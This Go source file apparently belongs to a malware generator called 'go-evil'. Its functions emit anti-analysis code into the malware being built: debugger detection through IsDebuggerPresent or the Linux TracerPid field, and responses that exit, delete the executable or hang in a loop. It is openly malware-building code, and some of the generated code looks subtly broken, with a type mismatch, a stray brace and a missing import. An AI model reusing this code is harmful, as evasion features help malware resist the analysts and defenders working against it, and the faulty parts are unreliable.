package parsing

import (
	"github.com/TeamPhoneix/go-evil/utility/structure"
)

//
//
// Adds the responsible code used for detecting if the malware is launched
// under a debugger
//
//
func identify_debugger(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func detect_debugger() bool {", "toReturn := false"}

	if data_object.Target_os == "windows" {
		body = append(body,
			"driver = windows.NewLazyDLL(\"kernel32.dll\")",
			"toReturn = driver.NewProc(\"IsDebuggerPresent\")",
			"}")

		data_object.Add_go_import("golang.org/x/sys/windows")
	} else {
		body = append(body,
			"file, err := os.Open(\"/proc/self/status\")",
			"if err == nil {",
			"defer file.Close()",

			"for {",
			"var tpid int",
			"num, err := fmt.Fscanf(file, \"TracerPid: %d\\n\", &tpid)",
			"if err == io.EOF {",
			"break",
			"}",

			"if num != 0{",
			"if tpid != 0{",
			"toReturn = true",
			"}",
			"break",
			"}",

			"}}")

		data_object.Add_go_import("io")
		data_object.Add_go_import("fmt")

	}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}

//
//
// Generate the debugger detection function
//
//
func stop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func stop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")

	return structure.Send(data_object)
}

//
//
// Generates the code which will remove the malware
// after it has been launched in a debugger
//
//
func remove_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func remove_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"path := tools.Grab_executable_path()",
		"os.Remove(path)",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	return structure.Send(data_object)
}

//
//
// Generates the code which will cause the malware to enter an infinite loop
//
//
func loop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func loop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"for {",
		"}}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}
